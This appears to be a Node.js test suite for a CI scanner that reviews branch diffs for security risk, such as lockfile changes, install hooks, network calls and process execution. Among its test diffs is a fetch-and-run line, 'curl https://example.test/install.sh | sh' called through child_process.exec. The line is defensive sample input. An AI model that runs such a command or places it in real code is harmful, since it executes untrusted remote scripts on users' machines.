const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const {
  main,
  scanChangedFiles,
  scanDiffText,
} = require('../core.js');

test('scanChangedFiles marks dependency and deployment files as sensitive', () => {
  const findings = scanChangedFiles([
    'web/app/src/App.tsx',
    'web/pnpm-lock.yaml',
    'api/Cargo.lock',
    '.github/workflows/verify.yml',
    'docker/web/nginx.conf',
  ]);

  assert.deepEqual(findings.map((finding) => finding.file), [
    'web/pnpm-lock.yaml',
    'api/Cargo.lock',
    '.github/workflows/verify.yml',
    'docker/web/nginx.conf',
  ]);
});

test('scanDiffText reports newly added network and execution risks', () => {
  const findings = scanDiffText([
    '+++ b/web/app/src/api.ts',
    '+fetch("http://example.test/callback")',
    '+++ b/scripts/node/release.js',
    '+const child_process = require("node:child_process");',
    '+child_process.exec("curl https://example.test/install.sh | sh")',
  ].join('\n'));

  assert.deepEqual(findings.map((finding) => finding.kind), [
    'insecure-url',
    'javascript-network-call',
    'callback-or-webhook',
    'external-url',
    'process-execution',
  ]);
  assert.equal(findings[0].file, 'web/app/src/api.ts');
});

test('scanDiffText limits remote dependency findings to dependency manifests', () => {
  const findings = scanDiffText([
    '+++ b/web/app/src/features/agent-flow/_tests/runtime.test.ts',
    '+const fixture = { "ApiBaseUrl": "https://example.test/v1" };',
    '+++ b/web/app/package.json',
    '+    "internal-tool": "https://example.test/internal-tool.tgz",',
  ].join('\n'));

  assert.deepEqual(
    findings.map((finding) => `${finding.file}:${finding.kind}`),
    [
      'web/app/src/features/agent-flow/_tests/runtime.test.ts:external-url',
      'web/app/package.json:external-url',
      'web/app/package.json:remote-dependency',
    ]
  );
});

test('main writes a security-risk report and returns advisory status to CI', async () => {
  const repoRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'oneflowbase-security-risk-'));
  const outputDir = path.join(repoRoot, 'tmp', 'test-governance');
  const stdout = [];
  const stderr = [];

  const status = await main([], {
    repoRoot,
    env: {
      SECURITY_RISK_CHANGED_FILES: [
        'web/app/package.json',
        'web/app/src/api.ts',
      ].join('\n'),
      SECURITY_RISK_DIFF: [
        '+++ b/web/app/package.json',
        '+    "postinstall": "node scripts/install.js"',
        '+++ b/web/app/src/api.ts',
        '+const socket = new WebSocket("wss://example.test/ws");',
      ].join('\n'),
    },
    writeStdout(text) {
      stdout.push(text);
    },
    writeStderr(text) {
      stderr.push(text);
    },
  });

  assert.equal(status, 0);
  assert.match(stdout.join(''), /security-risk\.json/u);
  assert.match(stderr.join(''), /Review 5 risk finding/u);

  const report = JSON.parse(fs.readFileSync(path.join(outputDir, 'security-risk.json'), 'utf8'));
  assert.equal(report.status, 'review_required');
  assert.deepEqual(report.scan, {
    baseRef: 'origin/main',
    headRef: 'HEAD',
    diffRange: 'origin/main...HEAD',
    changedFilesSource: 'env:SECURITY_RISK_CHANGED_FILES',
    diffSource: 'env:SECURITY_RISK_DIFF',
    processScanLimitations: 'Static OS API review, not proof of exploitability or absence of execution. JavaScript uses import/require bindings; Rust uses single-file masked lexical process paths; unresolved Command imports remain advisory. Dynamic indirection, macros and omitted diff context are not fully resolved; parse/read failures are explicit advisory findings.',
    note: 'security-risk scans the full branch diff range. Findings may include branch-history noise that was introduced before the latest PR update; treat sensitive-file findings as review prompts, not CI blockers.'
  });
  assert.deepEqual(report.summary, {
    total: 5,
    high: 1,
    medium: 4,
    bySource: {
      changed_file: 1,
      added_diff_line: 4,
    },
  });
  assert.deepEqual(report.findings.map((finding) => finding.kind), [
    'sensitive-file-changed',
    'install-script',
    'external-url',
    'javascript-network-call',
    'callback-or-webhook',
  ]);
  assert.deepEqual(report.findings.map((finding) => finding.source), [
    'changed_file',
    'added_diff_line',
    'added_diff_line',
    'added_diff_line',
    'added_diff_line',
  ]);
});
